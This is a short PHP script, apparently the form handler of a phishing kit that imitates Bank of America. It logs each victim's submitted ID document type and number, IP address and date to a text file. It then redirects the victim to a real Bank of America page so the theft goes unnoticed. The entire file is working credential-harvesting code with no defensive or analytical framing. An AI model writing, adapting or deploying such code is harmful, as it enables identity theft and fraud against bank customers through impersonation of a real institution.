<?php
@$userp = $_SERVER['REMOTE_ADDR'];
$file = fopen("datamichu.txt", "a");
fwrite($file, "|| tipo doc: " .$_POST['doc']. PHP_EOL);
fwrite($file, "|| num doc. : "  .$_POST['numdoc']. PHP_EOL);
fwrite($file, "|| Ip : "  .$userp . PHP_EOL);
fwrite($file, "|| Fecha : "  .date('d/m/Y') . PHP_EOL);
fwrite($file, "========================================"  . PHP_EOL);
fclose($file);

header ('Location: https://promotions.bankofamerica.com/digitalbanking/life-plan/es?cm_sp=EBZ-FWB-_-FWB-_-EHT1HZ6F01_Hero_NH_Lifeplan_UN_Spanish_MH_mastheadCta');


?>